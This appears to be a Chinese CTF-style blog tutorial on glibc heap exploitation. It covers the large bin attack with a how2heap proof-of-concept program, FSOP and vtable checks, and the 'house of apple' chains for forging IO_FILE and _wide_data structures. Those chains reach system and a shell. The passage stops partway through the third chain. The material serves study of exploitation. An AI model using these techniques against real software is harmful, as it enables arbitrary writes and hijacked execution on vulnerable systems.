    <title>猫猫 &amp;&amp; 苹果香蕉 の 屋</title>
    <url>/2023/11/02/%E7%8C%AB%E7%8C%AB%20&amp;&amp;%20%E8%8B%B9%E6%9E%9C%E9%A6%99%E8%95%89%20%E3%81%AE%20%E5%B1%8B/</url>
    <content><![CDATA[<blockquote>
<p>大古：一开始就用红色形态作战不就行了吗</p>
</blockquote>
<span id="more"></span>

<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>glibc</code> 高版本逐渐移除了<code>__malloc_hook/__free_hook/__realloc_hook</code> 等等一众 <code>hook</code> 全局变量。</p>
<p>利用手段向 IO_FILE 靠拢，但是随着版本越来越高，堆利用手段也变少，IO_FILE 的问题也逐渐减少。</p>
<h3 id="large-bin-attck"><a href="#large-bin-attck" class="headerlink" title="large bin attck"></a>large bin attck</h3><p>一个范围的bin，保证了其内部有序性。在 <a href="https://xz.aliyun.com/t/5177">浅析largebin attack</a>文章中有张图方便理解<br>同样大小的bin按照free的时间顺序进行排序</p>
<ul>
<li>fd, bk: 相同大小堆的双向链表，按照时间先后排序</li>
<li>fd_nextsize, bk_nextsize: 大小不同的双向链表</li>
<li>如果只有一个，fd, bk指向 main_arena fd_nextsize 和 bk_nextsize 指向自己</li>
</ul>
<p>直接使用 how2heap 2.36 的 large bin attack 进行演示(Glibc &gt;&#x3D; 2.30 都可以使用)。</p>
<ul>
<li>漏洞的点在开头的注释中给出，就是最后一句赋值语句导致的，victim(正在链入largebin)的size小于已经存在的bin</li>
<li>malloc两个大chunk p1,p2，两个 0x18 是防止 <strong>相邻的unsorted bin 合并</strong> 以及 <strong>被top_chunk合并</strong>。</li>
<li>这里注意的是：p1 的 size 大于 p2，但是不要差太多，在同一个largebin 里</li>
<li>free p1，将 p1 放入large bin 中</li>
<li>free p2，修改 p1 的 bk_nextsize 为 &amp;target-0x20</li>
<li>将 p2 放入largebin中</li>
<li>target 值就变成了 p2 的地址</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">A revisit to large bin attack for after glibc2.30</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Relevant code snippet :</span></span><br><span class="line"><span class="comment">	// 因为只有两个bin，因此可以解读一下。</span></span><br><span class="line"><span class="comment">	// 看源码，bck是  bck = bin_at (av, victim_index);</span></span><br><span class="line"><span class="comment">	// av 就是 arena地址，bck就是找arena</span></span><br><span class="line"><span class="comment">	// fwd = bck-&gt;fd;   与large bin 之间的双向链表，在这里就是存在的 p1</span></span><br><span class="line"><span class="comment">	if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk)) &#123;</span></span><br><span class="line"><span class="comment">		fwd = bck;                                    // fwd = arena</span></span><br><span class="line"><span class="comment">		bck = bck-&gt;bk;                                // bck = p1</span></span><br><span class="line"><span class="comment">		victim-&gt;fd_nextsize = fwd-&gt;fd;                // vitim 要放入large bin 的堆 p2 </span></span><br><span class="line"><span class="comment">		victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;   // victim.bk_nextsize = p1-&gt;bk_nextsize = &amp;target-0x20 </span></span><br><span class="line"><span class="comment">		fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;  // p1.bk_nextsize = victim</span></span><br><span class="line"><span class="comment">		// 但是victim.bk_nextsize = &amp;target-0x20。而这个地址的 fd_nextsize = victim 也就是将 target 值改为 victim，</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="comment">/*Disable IO buffering to prevent stream from interfering with heap*/</span></span><br><span class="line">  <span class="built_in">setvbuf</span>(stdin,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stderr,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since glibc2.30, two new checks have been enforced on large bin chunk insertion\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Check 1 : \n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;    if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (nextsize)\&quot;);\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Check 2 : \n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;    if (bck-&gt;fd != fwd)\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (bk)\&quot;);\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;This prevents the traditional large bin attack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;However, there is still one possible path to trigger large bin attack. The PoC is shown below : \n\n&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> target = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Here is the target we want to overwrite (%p) : %lu\n\n&quot;</span>,&amp;target,target);</span><br><span class="line">  <span class="type">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;First, we allocate a large chunk [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="type">size_t</span> *g1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;And another chunk to prevent consolidate\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;We also allocate a second large chunk [p2]  (%p).\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;This chunk should be smaller than [p1] and belong to the same large bin.\n&quot;</span>);</span><br><span class="line">  <span class="type">size_t</span> *g2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Once again, allocate a guard chunk to prevent consolidate\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Free the larger of the two --&gt; [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="type">size_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Allocate a chunk larger than [p1] to insert [p1] into large bin\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Free the smaller of the two --&gt; [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;At this point, we have one chunk in large bin [p1] (%p),\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;               and one chunk in unsorted bin [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  p1[<span class="number">3</span>] = (<span class="type">size_t</span>)((&amp;target)<span class="number">-4</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Now modify the p1-&gt;bk_nextsize to [target-0x20] (%p)\n&quot;</span>,(&amp;target)<span class="number">-4</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> *g4 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\n&quot;</span>, p2<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since glibc does not check chunk-&gt;bk_nextsize if the new inserted chunk is smaller than smallest,\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;  the modified p1-&gt;bk_nextsize does not trigger any error\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Upon inserting [p2] (%p) into largebin, [p1](%p)-&gt;bk_nextsize-&gt;fd_nextsize is overwritten to address of [p2] (%p)\n&quot;</span>, p2<span class="number">-2</span>, p1<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;In out case here, target is now overwritten to address of [p2] (%p), [target] (%p)\n&quot;</span>, p2<span class="number">-2</span>, (<span class="type">void</span> *)target);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Target (%p) : %p\n&quot;</span>,&amp;target,(<span class="type">size_t</span>*)target);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">assert</span>((<span class="type">size_t</span>)(p2<span class="number">-2</span>) == target);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>达到一个任意地址写成堆地址的目的。<br>Glibc 2.29 之前，unsortedbin attack 和 largebin attack 都是攻击 bk 指针，但是后来加了一句检查</p>
<p>在攻击时，fd,bk,fd_nextsize 可以随便覆盖内容，在经过malloc后会修复fd，因为fd指向 size 较小的 victim</p>
<h3 id="IO-流"><a href="#IO-流" class="headerlink" title="IO 流"></a>IO 流</h3><p>这里一般指 存在一条链，某个函数 使用 vtable 的函数指针来调用函数。</p>
<p>程序使用exit退出程序</p>
<ul>
<li>从main函数退出，glibc会调用exit</li>
<li>显示调用 exit 函数退出程序</li>
</ul>
<p>malloc_assert: house of kiwi 提出，触发下面的条件选一个</p>
<ul>
<li>topchunk的大小小于MINSIZE(0X20)  </li>
<li>prev inuse位为0  </li>
<li>old_top页未对齐</li>
<li>但是从libc 2.36 发生了一点变化，移除IO操作，也就是从libc 2.36不能使用</li>
<li>libc 2.37 直接没有这个函数了。</li>
</ul>
<p>libc 2.35：</p>
<ul>
<li>两个函数(fflsh, fxpeintf)都涉及IO操作。</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line">		 <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  (<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">		     __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     file, line,</span><br><span class="line">		     function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     assertion);</span><br><span class="line">  <span class="built_in">fflush</span> (stderr);</span><br><span class="line">  <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h3><p>FSOP就是通过劫持_IO_list_all的值（如large bin attack修改）来执行_IO_flush_all_lockp函数，这个函数会根据_IO_list_all刷新链表中的所有文件流.</p>
<p>当程序从 main 函数返回或者执行 exit 函数的时候，均会调用 fcloseall 函数，调用链如下</p>
<ul>
<li>最后会遍历<code>_IO_list_all</code> 存放的每一个 <code>IO_FILE</code> 结构体</li>
<li>如果满足条件的话，会调用每个结构体中 <code>vtable-&gt;_overflow</code> 函数指针指向的函数。</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">exit</span><br><span class="line">	fcloseall</span><br><span class="line">		_IO_cleanup</span><br><span class="line">			_IO_flush_all_lockp</span><br><span class="line">				_IO_OVERFLOW</span><br></pre></td></tr></table></figure>


<p>vtable 函数调用过程，就是调用跳表，比如说调用 <code>__overflow</code> </p>
<ul>
<li><code>IO_validate_vtable</code>函数负责检查<code>vtable</code>的合法性，会判断<code>vtable</code>的地址是不是在一个合法的区间。如果<code>vtable</code>的地址不合法，程序将会异常终止。</li>
<li>最后就是调用 vtable 里面的函数</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))a</span></span><br></pre></td></tr></table></figure>

<p>检查函数</p>
<ul>
<li>检查此结构体的 vtable 与 <code>__io_vtables</code> 全局变量表偏移</li>
<li>在这个表里的表就能通过检查。</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span> *</span><br><span class="line"><span class="built_in">IO_validate_vtable</span> (<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uintptr_t</span> ptr = (<span class="type">uintptr_t</span>) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr - (<span class="type">uintptr_t</span>) &amp;__io_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= IO_VTABLES_LEN))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以现在劫持vtable都差不多在这个表里找一个能符合条件的表进行利用。</p>
<p>比如挟持到 <code>_wide_data</code> 相关的表，因为这个表含有vtable，并且函数调用没有检查。</p>
<ul>
<li>而与其相关的表有3个 找 <code>_IO_wfile_jumps</code> 开头的表存在三个</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WIDE_JUMPS(THIS) \</span></span><br><span class="line"><span class="meta">  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable</span></span><br></pre></td></tr></table></figure>

<h2 id="house-of-apple"><a href="#house-of-apple" class="headerlink" title="house of apple"></a>house of apple</h2><blockquote>
<p>有三个版本，这里是 version 2.0，控制函数执行流。</p>
</blockquote>
<ol>
<li>IO 流：exit 或者 malloc_assert</li>
<li>能泄露出 <code>heap</code> 地址和 <code>libc</code> 地址 </li>
<li>能使用一次 <code>largebin attack</code>（一次即可）</li>
</ol>
<p>wide_data 结构体</p>
<ul>
<li>其中也存在一个 vtable</li>
<li>由上面的FSOP知道，在调用<code>_wide_vtable</code>虚表里面的函数时，同样是使用宏去调用，但是没有检查，因此更好利用</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_wide_data</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_ptr;    <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;    <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;    <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;    <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;    <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;    <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_base;    <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_end;        <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_base;    <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_backup_base;    <span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">                   backup area */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_end;    <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"> </span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_codecvt</span> _codecvt;</span><br><span class="line">  <span class="type">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line">  <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span> *_wide_vtable;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>假设劫持了vtable 到 <code>IO_wdata_jumps</code> 之后，调用overflow</p>
<ul>
<li>因为是宏展开，进入 <code>_IO_wfile_jumps</code> 的 overflow 函数。</li>
<li>而这个函数执行流如下</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">wint_t</span> _IO_wfile_overflow(FILE *f, <span class="type">wint_t</span> wch) &#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">  &#123;</span><br><span class="line">    f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">    __set_errno(EBADF);</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> ||</span><br><span class="line">      f-&gt;_wide_data-&gt;_IO_write_base == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">    <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_write_base == <span class="number">0</span>) &#123;</span><br><span class="line">      _IO_wdoallocbuf(f);</span><br><span class="line">      _IO_free_wbackup_area(f);</span><br><span class="line">      _IO_wsetg(f, f-&gt;_wide_data-&gt;_IO_buf_base, f-&gt;_wide_data-&gt;_IO_buf_base,</span><br><span class="line">                f-&gt;_wide_data-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        _IO_doallocbuf(f);</span><br><span class="line">        _IO_setg(f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">/* Otherwise must be currently reading.  If _IO_read_ptr</span></span><br><span class="line"><span class="comment">         (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment">         logically slide the buffer forwards one block (by setting</span></span><br><span class="line"><span class="comment">         the read pointers to all point at the beginning of the</span></span><br><span class="line"><span class="comment">         block).  This makes room for subsequent output.</span></span><br><span class="line"><span class="comment">         Otherwise, set the read pointers to _IO_read_end (leaving</span></span><br><span class="line"><span class="comment">         that alone, so it can continue to correspond to the</span></span><br><span class="line"><span class="comment">         external position). */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_read_ptr == f-&gt;_wide_data-&gt;_IO_buf_end) &#123;</span><br><span class="line">        f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">        f-&gt;_wide_data-&gt;_IO_read_end = f-&gt;_wide_data-&gt;_IO_read_ptr =</span><br><span class="line">            f-&gt;_wide_data-&gt;_IO_buf_base;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    f-&gt;_wide_data-&gt;_IO_write_ptr = f-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line">    f-&gt;_wide_data-&gt;_IO_write_base = f-&gt;_wide_data-&gt;_IO_write_ptr;</span><br><span class="line">    f-&gt;_wide_data-&gt;_IO_write_end = f-&gt;_wide_data-&gt;_IO_buf_end;</span><br><span class="line">    f-&gt;_wide_data-&gt;_IO_read_base = f-&gt;_wide_data-&gt;_IO_read_ptr =</span><br><span class="line">        f-&gt;_wide_data-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">    f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">    f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">    f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">    f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">    f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">      f-&gt;_wide_data-&gt;_IO_write_end = f-&gt;_wide_data-&gt;_IO_write_ptr;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (wch == WEOF) <span class="keyword">return</span> _IO_do_flush(f);</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_write_ptr == f-&gt;_wide_data-&gt;_IO_buf_end)</span><br><span class="line">    <span class="comment">/* Buffer is really full */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush(f) == EOF) <span class="keyword">return</span> WEOF;</span><br><span class="line">  *f-&gt;_wide_data-&gt;_IO_write_ptr++ = wch;</span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED) ||</span><br><span class="line">      ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; wch == <span class="string">L&#x27;\n&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush(f) == EOF) <span class="keyword">return</span> WEOF;</span><br><span class="line">  <span class="keyword">return</span> wch;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">libc_hidden_def</span>(_IO_wfile_overflow)</span><br></pre></td></tr></table></figure>

<p>主要看其中的函数调用，这里主要看作者的几条连</p>
<p>链1：<code>_IO_wfile_overflow</code> 控制函数执行流，但是需要绕过某些检查。伪造fp</p>
<ul>
<li><code>_flags</code>设置为<code>~(2 | 0x8 | 0x800)</code>，如果不需要控制<code>rdi</code>，设置为<code>0</code>即可；如果需要获得<code>shell</code>，可设置为<code>  sh;</code>，前面有两个空格</li>
<li><code>vtable</code>设置为<code>_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_overflow</code>即可</li>
<li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_write_base</code>设置为<code>0</code>，即满足<code>*(A + 0x18) = 0</code></li>
<li><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足<code>*(A + 0x30) = 0</code></li>
<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code>，比如说C为system函数</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">_IO_wfile_overflow</span><br><span class="line">    _IO_wdoallocbuf</span><br><span class="line">        _IO_WDOALLOCATE</span><br><span class="line">            *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x68</span>)(fp)</span><br></pre></td></tr></table></figure>

<p>链2：<code>_IO_wfile_underflow_mmap</code> 控制函数执行流</p>
<ul>
<li><code>_flags</code>设置为<code>~4</code>，如果不需要控制<code>rdi</code>，设置为<code>0</code>即可；如果需要获得<code>shell</code>，可设置为<code> sh;</code>，注意前面有个空格</li>
<li><code>vtable</code>设置为<code>_IO_wfile_jumps_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_underflow_mmap</code>即可</li>
<li><code>_IO_read_ptr &lt; _IO_read_end</code>，即满足<code>*(fp + 8) &lt; *(fp + 0x10)</code></li>
<li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>，即满足<code>*A &gt;= *(A + 8)</code></li>
<li><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足<code>*(A + 0x30) = 0</code></li>
<li><code>_wide_data-&gt;_IO_save_base</code>设置为<code>0</code>或者合法的可被<code>free</code>的地址，即满足<code>*(A + 0x40) = 0</code></li>
<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code></li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">_IO_wfile_underflow_mmap</span><br><span class="line">    _IO_wdoallocbuf</span><br><span class="line">        _IO_WDOALLOCATE</span><br><span class="line">            *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x68</span>)(fp)</span><br></pre></td></tr></table></figure>

<p>链3：<code>_IO_wdefault_xsgetn</code> 控制函数执行流</p>
<ul>
<li><code>_flags</code>设置为<code>0x800</code></li>
<li><code>vtable</code>设置为<code>_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps</code>地址（加减偏移），使其能成功调用<code>_IO_wdefault_xsgetn</code>即可</li>
<li><code>_mode</code>设置为大于<code>0</code>，即满足<code>*(fp + 0xc0) &gt; 0</code></li>
<li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_read_end == _wide_data-&gt;_IO_read_ptr</code>设置为<code>0</code>，即满足<code>*(A + 8) = *A</code></li>
<li><code>_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</code>，即满足<code>*(A + 0x20) &gt; *(A + 0x18)</code></li>
